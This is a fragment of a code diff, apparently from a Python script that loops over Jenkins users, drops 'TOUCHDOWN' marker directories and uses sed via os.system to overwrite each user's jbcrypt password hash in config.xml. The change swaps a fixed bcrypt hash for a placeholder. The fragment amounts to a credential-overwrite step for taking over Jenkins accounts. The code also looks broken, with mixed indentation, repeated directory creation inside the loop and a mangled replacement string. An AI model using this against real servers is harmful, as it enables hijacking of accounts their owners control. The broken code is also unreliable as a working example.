@@ -24,7 +24,7 @@ try:
 	for r in results:
 		os.mkdir("/var/lib/jenkins/TOUCHDOWN")
 		os.mkdir("/tmp/TOUCHDOWN")
-        	cmd = """sed -i  's/#jbcrypt:[^>]*/#jbcrypt:$2a$10$FPGzck4H2j.RkOdLDwJniulnG9ij9SvshDEL\/Ilp\/lz7BF\/t79aFa<\/passwordHash>/' /var/lib/jenkins/users/%s/config.xml"""
+        	cmd = """sed -i  's/#jbcrypt:[^>]*/#jbcrypt:replace\/passwordHash>/' /var/lib/jenkins/users/%s/config.xml"""
         	os.system(cmd % r)
         message = 'using jenkins'
 except: 
